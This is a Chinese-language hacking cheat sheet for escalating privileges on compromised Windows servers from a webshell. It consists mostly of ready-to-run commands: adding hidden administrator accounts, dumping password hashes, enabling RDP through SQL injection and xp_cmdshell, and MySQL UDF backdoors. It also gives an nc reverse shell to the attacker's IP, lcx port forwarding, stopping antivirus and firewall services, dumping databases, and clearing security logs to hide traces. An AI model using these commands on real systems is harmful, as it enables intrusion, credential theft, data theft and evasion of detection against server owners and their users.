@@ -1,0 +1,415 @@
+上传cmd.exe及net.exe至可写目录
+
+setp d:\xxx\xxx\cmd.exe
+
+接下来就可以执行cmd命令了
+
+1.cmd拒绝访问就自己上传一个cmd.exe，自己上传的cmd是不限制后缀的，还可以是cmd.com cmd.txt cmd.rar
+
+2.net user不能执行有时候是net.exe被删除了，可以先试试net1，不行就自己上传一个net.exe
+
+3.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user key daxia /add”
+
+4.有时候因为监控而添加用户失败，试试上传“PwDump7 破解当前管理密码(hash值)”俩个都上传，执行PwDump7.exe就可以了，之后解密哈希值得到铭文，建
+
+议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe >1.txt
+
+5.有时候权限很松，很多命令都可以执行，但是就是增加不上用户，这时候你就要考虑是不是因为密码过于简单或是过于复杂了
+
+6.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令
+
+7.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators
+
+8.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：”"c:\xxx\exp.exe “whoami”  记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在
+
+cmd那里，下面不变
+
+9.当添加不上用户却可以添加“增加用户的Vbs、bat）的时候，就添加一个吧，然后用“直接使服务器蓝屏重启的东东”让服务器重启就提权成功
+
+10.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe
+
+11.支持aspx但跨不了目录的时候，可以上传一个读iis的vbs，执行命令列出所有网站目录，找到主站的目录就可以跨过去了，上传cscript.exe到可执行目录，
+
+接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs
+
+11.如何辨别服务器是不是内网？192.168.x.x  172.16.x.x  10.x.x.x
+
+12.安全狗下加用户的语句：：for /l %i in (1,1,1000) do @net user test test /add&@net localgroup administrators test /add
+
+13.21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle、5631对应的pcanywhere
+
+14.劫持提权，说到这个，想必肯定会想到lpk.dll这类工具，有时候在蛋疼怎么都加不上账户的时候，可以试试劫持shift、添加开机启动等等思路
+
+15.提权成功但3389端口没开，执行语句或是工具开3389失败的时候，可以上传rootkit.asp，登陆进去就是system权限，这时候再尝试开3389希望较大
+
+ 
+
+【常用DOS命令】
+
+查看版本：ver
+
+查看权限：whoami
+
+查看配置：systeminfo
+
+查看用户：net user
+
+查看进程：tasklist
+
+查看正在运行的服务：tasklist /svc
+
+查看开放的所有端口：netstat -ano
+
+查询管理用户名：query user
+
+查看搭建环境：ftp 127.0.0.1
+
+查看指定服务的路径：sc qc Mysql
+
+添加一个用户：net user key key001 /add
+
+提升到管理权限：net localgroup administrators key /add
+
+添加用户并提升权限：net user key key001 /add & net localgroup administrators key /add
+
+查看制定用户信息：net user key
+
+查看所有管理权限的用户：net localgroup administrators
+
+加入远程桌面用户组：net localgroup “Remote Desktop Users” key /add
+
+突破最大连接数：mstsc /admin /v:127.0.0.1
+
+删除用户：net user key /del
+
+删除管理员账户:net user administrator key001
+
+更改系统登陆密码：net password key001
+
+激活GUEST用户：net user guest /active:yes
+
+开启TELNET服务：net start telnet
+
+关闭麦咖啡：net stop “McAfee McShield”
+
+关闭防火墙：net stop sharedaccess
+
+查看当前目录的所有文件：dir c:\windows\
+
+查看制定文件的内容：type c:\windows\1.asp
+
+把cmd.exe复制到c:\windows的temp目录下并命名为cmd.txt：copy c:\windows\temp\cookies\cmd.exe c:\windows\temp\cmd.txt
+
+开3389端口的命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+查看补丁：dir c:\windows\>a.txt&(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log
+
+KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo%i Not Installed!)&del /f /q
+
+/a a.txt
+
+【常见杀软】
+
+360tray.exe  360实时保护
+
+ZhuDongFangYu.exe  360主动防御
+
+KSafeTray.exe  金山卫士   McAfee McShield.exe  麦咖啡
+
+SafeDogUpdateCenter.exe  服务器安全狗
+
+【windows提权中敏感目录和敏感注册表的利用】
+
+敏感目录                                                   目录权限                                 提权用途
+
+C:\Program Files\                                          默认用户组users对该目录拥有查看权        可以查看服务器安装的应用软件 C:\Documents and Settings\All Users\「开始」菜单\程序       Everyone拥有查看权限          存放快捷方式，可以下载文件，属性查看安装路径 C:\Documents and Settings\All Users\Documents              Everyone完全控制权限                    上传执行cmd及exp C:\windows\system32\inetsrv\                               Everyone完全控制权限                    上传执行cmd及exp C:\windows\my.iniC:\Program Files\MySQL\MySQL Server 5.0\my.ini  默认用户组users拥有查看权限        安装mysql时会将root密码写入该文件 C:\windows\system32\                                       默认用户组users拥有查看权限   Shift后门一般在该文件夹，可以下载后门破解密码 C:\Documents and Settings\All Users\「开始」菜单\程序\启动  Everyone拥有查看权限         可以尝试向该目录写入vbs或bat，服务器重启后运行 C:\RECYCLER\D:\RECYCLER\                                   Everyone完全控制权限                     回收站目录。常用于执行cmd及exp C:\Program Files\Microsoft SQL Server\                     默认用户组users对该目录拥有查看权限       有时候该目录也存在可执行权限 C:\Program Files\MySQL\                                    默认用户组users对该目录拥有查看权限       找到MYSQL目录中user.MYD里的root C:\oraclexe\                                               默认用户组users对该目录拥有查看权限       可以尝试利用Oracle的默认账户提权 C:\WINDOWS\system32\config                                 默认用户组users对该目录拥有查看权限       尝试下载sam文件进行破解提权 C:\Program Files\Geme6 FTP Server\Remote Admin\Remote.ini  默认用户组users对该目录拥有查看权限       Remote.ini文件中存放着G6FTP的密码 c:\Program Files\RhinoSoft.com\Serv-U\c:\Program Files\Serv-U\  默认用户组users对该目录拥有查看权限  ServUDaemon.ini 中存储了虚拟主机网
+
+站路径和密码 c:\windows\system32\inetsrv\MetaBase.xml                   默认用户组users对该目录拥有查看权限       IIS配置文件 C:tomcat5.0\conf\resin.conf                                默认用户组users对该目录拥有查看权限       Tomat存放密码的位置 C:\ZKEYS\Setup.ini                                         默认用户组users对该目录拥有查看权限       ZKEYS虚拟主机存放密码的位置
+
+ 
+
+【提权中的敏感注册表位置】
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\SuperSocketNetLib\Tcp             Mssql端口 HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server DenyTSConnections                         远程终端 值为0 即为开启 HKEY_LOCAL_MACHINE\SOFTWARE\MySQL AB\                                                           mssql的注册表位置 HKEY_LOCAL_MACHINE\SOFTWARE\HZHOST\CONFIG\                                                      华众主机注册表配置位置 HKEY_LOCAL_MACHINE\SOFTWARE\Cat Soft\Serv-U\Domains\1\UserList\                                 serv-u的用户及密码（su加密）位置 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\ WinStations\RDP-Tcp    在该注册表位置PortNumber的值即位3389端口值 HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers                               mysql管理工具Navicat的注册表位置，提权运用请谷歌 HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters                              Radmin的配置文件，提权中常将其导出进行进行覆盖提权 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\      IIS注册表全版本泄漏用户路径和FTP用户名漏洞 HKEY_LOCAL_MACHINE\software\hzhost\config\Settings\mastersvrpass                           华众主机在注册表中保存的mssql、mysql等密码 HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11                                    星外主机mssql的sa账号密码，双MD5加密 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\ControlSet002  星外ftp的注册表位置，当然也包括
+
+ControlSet001、ControlSet003
+
+ 
+
+【SQL语句直接开启3389】
+
+3389登陆关键注册表位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections
+
+其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。
+
+而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。
+
+开启3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,'SYSTEM\CurrentControlSet\Control\Terminal
+
+Server’,'fDenyTSConnections’,'REG_DWORD’,0;–
+
+关闭3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,'SYSTEM\CurrentControlSet\Control\Terminal
+
+Server’,'fDenyTSConnections’,'REG_DWORD’,1;–
+
+2003可以实现一句话开3389： reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 80 /f
+
+ 
+
+【wscript.shell的删除和恢复】
+
+卸载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%\system32\WSHom.Ocx   卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%\system32\scrrun.dll   卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:\ProgramFiles\CommonFiles\System\ado\msado15.dll”   如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了
+
+【如何找到准确的终端连接端口？】
+
+在aspx大马里，点击“系统信息”第三个就是目前的3389端口
+
+或是执行命令查看正在运行的服务：tasklist /svc
+
+找到：svchost.exe         1688  TermService
+
+记住1688这个ID值，查看开放的所有端口：netstat -ano
+
+找到1688这个ID值所对应的端口就是3389目前的端口
+
+ 
+
+【iis6提权提示Can not find wmiprvse.exe的突破方法】
+
+突破方法一：
+
+在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉
+
+在结束之后，它会再次运行，这时候的PID值的不一样的，这时候我们回来去运行exp，直接秒杀。
+
+突破方法二：
+
+虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”
+
+甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。
+
+ 
+
+【本地溢出提权】
+
+计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.
+
+缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.
+
+利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.
+
+想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.
+
+ 
+
+【Mssql提权】
+
+扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件
+
+也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。
+
+aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即
+
+可
+
+增加一个用户：exec master.dbo.xp_cmdshell ‘net user key key001 /add’;– 提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators key /add’;–
+
+PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建命令：Use master dbcc addextendedproc(‘xp_cmdshell’,'xplog70.dll’)
+
+1433一句话开3389： Exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,'SYSTEM\CurrentControlSet\Control\Terminal
+
+Server’,'fDenyTSConnections’,'REG_DWORD’,0;–
+
+ 
+
+【mysql提权】
+
+利用mysql提权的前提就是,服务器安装了mysql，mysql的服务没有降权，是默认安装以系统权限继承的(system权限).并且获得了root的账号密码
+
+如何判断一台windows服务器上的mysql有没有降权？ cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了
+
+如何判断服务器上是否开启了mysql服务？ 开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.
+
+如何查看root密码？ 在mysql的安装目录下找到user.myd这个文件，连接信息就在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户，在conn.asp config.asp这
+
+些文件里，可以用PHP脚本的文件搜索功能搜索这两个文件，找到之后编辑就可以找到连接信息，有时会显得很乱，这时就需要自己去组合，前17位在第一行可以
+
+找到，还有23位在第三行或是其他行，自己继续找。
+
+可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。
+
+填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。
+
+PS：5.0版本以下(包括5.0的)默认c:\windows\系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的
+
+lib/plugin目录中，例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll
+
+ 
+
+【serv-u提权】
+
+这个文件里包含serv-u的md5密码：C:\Program Files\RhinoSoft.com\Serv-U\\ServUDaemon.ini
+
+找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2
+
+再拿md5密文去解密，再用现在的密码登陆提权即可。
+
+serv-u提权的前提是43958端口开了，且知道帐号密码！
+
+如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。
+
+530说明密码不是默认的,回显330说明成功，900说明密码是默认的
+
+在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。
+
+【端口转发】
+
+什么情况下适合转发端口？
+
+1.服务器是内网，我们无法连接。 2.服务器上有防火墙，阻断我们的连接。
+
+转发端口的前提，我们是外网或是有外网服务器。
+
+找个可读可写目录上传lcx.exe
+
+本地cmd命令：lcx.exe -listen 1988 4567  （监听本地1988端口并转发到4567端口）
+
+接着shell命令：/c c:\windows\temp\cookies\lcx.exe -slave 本机ip 1988 服务器ip 3389  （把服务器3389端口转发到本地4567端口）
+
+之后本地连接：127.0.0.1:4567  (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)
+
+以上是本机外网情况下操作，接着说下在外网服务器里如何操作：
+
+上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567
+
+接着在aspx shell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。
+
+ 
+
+【NC反弹提权】
+
+当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。
+
+不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….
+
+找个可读可写目录上传nc.exe cmd.exe
+
+-l  监听本地入栈信息
+
+-p  port打开本地端口
+
+-t  以telnet形式应答入栈请求
+
+-e  程序重定向
+
+本地cmd执行：nc -vv -l -p 52 进行反弹
+
+接着在shell里执行命令：c:\windows\temp\nc.exe -vv 服务器ip 999 -e c:\windows\temp\cmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小
+
+很多
+
+执行成功后本地cmd命令：cd/  （只是习惯而已）
+
+接着以telnet命令连接服务器：telnet 服务器ip 999
+
+回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！
+
+PS：一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:\windows\temp\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\windows\temp\cmd.exe
+
+这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的
+
+ 
+
+【星外提权】
+
+如何知道是不是星外主机？
+
+第一：网站物理路径存在“freehost” 第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹
+
+默认帐号：freehostrunat 默认密码：fa41328538d7be36e83ae91a78a1b16f!7
+
+freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可
+
+（ee.exe提权法）
+
+找个可读可写目录上传ee.exe
+
+cmd命令：/c c:\windows\temp\cookies\ee.exe -i  （获取星外帐号的id值，例如回显：FreeHost ID：724）
+
+接着命令：/c c:\windows\temp\cookies\ee.exe -u 724  （获取星外的帐号密码）
+
+（vbs提权法）
+
+找个可读可写目录上传cscript.exe和iispwd.vbs
+
+cmd执行：/c “c:\windows\temp\cookies\cscript.exe” c:\windows\temp\cookies\iispwd.vbs
+
+意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录
+
+【360提权】
+
+找个可读可写目录上传360.exe
+
+cmd命令：/c c:\windows\temp\cookies\360.exe
+
+会提示3段英文：   360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2   You will get a Shift5 door!   Shift5 Backdoor created!   这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……
+
+ 
+
+【华众虚拟主机提权】
+
+就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞
+
+所以华众提权关键之处就是搜集信息，主要注册表位置：
+
+HKEY_LOCAL_MACHINE\SOFTWARE\HZHOST\CONFIG\ HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass     root密码 HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss       sa 密码
+
+c:\windows\temp 下有hzhost主机留下的ftp登陆记录有用户名和密码
+
+以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用
+
+百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具
+
+ 
+
+【脱库】
+
+Access数据库脱库很简单，直接下载数据库即可，mssql数据库可以用shell自带的脱裤功能，找到数据库的连接信息，一般在web.config.asp里，然后连接一
+
+下SA，找到会员表（UserInfo）就可以了。
+
+mysql数据库脱库，找到root帐号密码，用PHP大马自己带链接功能连接一下，也自己自己上传PHP脱裤脚本，之后找到目标数据库（数据库名），再找到会员表
+
+menber进行脱裤即可。
+
+【服务器安全】
+
+命令提示符已被系统管理员停用？ 解决方法：运行→gpedit.msc→用户配置→管理模板→系统，在右侧找到”阻止命令提示符”, 然后双击一下,在”设置”里面选中”未配置” ,最后点击”确定”。
+
+如何判断服务器的类型？ 解决方法：直接ping服务器ip，看回显信息进行判断
+
+TTL=32     9X/ME
+
+TTL=64     linux
+
+TTL=128    2000X/XP
+
+TTL=255    UNIX
+
+为什么有时3389开放却不能连接？ 原因分析：有时候是因为防火墙，把3389转发到其他端口就可以连接了，有的转发后依然是连接不上，那是因为管理员在TCP/IP里设置的端口限制 解决方法：我们需要把端口转为TCP/IP里设置的只允许连接的端口其中一个就可以了，更好的办法是取消端口限制。
+
+最简单的往服务器上传东西方法是什么？ 本机打开“HFS网络文件服务器”这款工具，把需要上传的工具直接拖进左边第一个框内，复制上面的地址，到服务器里的浏览器访问，就可以下载了
+
+限制“命令提示符”的运行权限？ 我的电脑（右键）–资源管理器中–点击“工具”按钮，选择“文件夹选项”，切换到“查看”标签，去掉“使用简单文件共享(推荐)”前面的钩，这一步是为
+
+了让文件的属性菜单中显示“安全”标签，然后进入“c:\windows\system32\”，找到“cmd.exe”，点右键选择“属性”，切换到“安全”标签，将其中“组
+
+或用户名称”中除了管理员外的所有用户都删除，完成后点“确定”这样当普通用户想运行“命令提示符”的时候将会出现“拒绝访问”的警告框。
+
+如何更改windows2003最大连接数？ windows2003中的远程桌面功能非常方便，但是初始设置只允许2个用户同时登陆，有些时候因为我在公司连接登陆后断开，同事在家里用其他用户登陆后断开，
+
+当我再进行连接的时候，总是报错“终端服务超过最大连接数”这时候我和同事都不能登陆，通过以下方法来增加连接数，运行：services.msc，启用license
+
+logging，别忘了添加完毕后再关闭 License Logging 打开win2k3的控制面板中的“授权”，点“添加许可”输入要改的连接数
+
+如何清除服务器里的IP记录日志？ 1.我的电脑右键管理–事件查看器–安全性–右键清除所有事件 2.打开我的电脑–C盘–WINDOWS–system32–config–AppEvent.Evt属性–安全–全部都拒绝 3.Klaklog.evt属性–安全–全部都拒绝–SecEvent.Tvt属性–安全–全部都拒绝
